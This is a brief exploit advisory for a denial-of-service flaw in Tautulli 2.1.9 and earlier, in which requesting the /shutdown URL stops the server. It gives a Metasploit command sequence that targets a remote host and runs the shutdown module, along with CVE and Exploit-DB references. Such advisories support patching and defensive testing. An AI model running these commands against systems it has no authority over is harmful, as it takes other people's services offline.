# Tautulli 2.1.9 - Shutdown Denial of Service

## Overview
Tautulli versions 2.1.9 and prior are vulnerable to denial of service via the /shutdown URL.

## Vulnerable Application :

```
Date: 2018-12-17 
Exploit Author: Ismail Tasdelen
Vendor Homepage: https://tautulli.com/
Software : https://github.com/Tautulli/Tautulli
Product Version: v2.1.9
Platform: Windows 10 (10.0.18362)
Python Version: 2.7.11 (v2.7.11:6d1b6a68f775, Dec 5 2015, 20:40:30) [MSC v.1500 64 bit (AMD64)]
```

## Using

```
msfconsole -q
use auxiliary/dos/http/tautulli_shutdown_exec
set RHOSTS XXX.XXX.XXX.XXX
exploit
```

## References :

CVE:2019-19833
EDB:47785
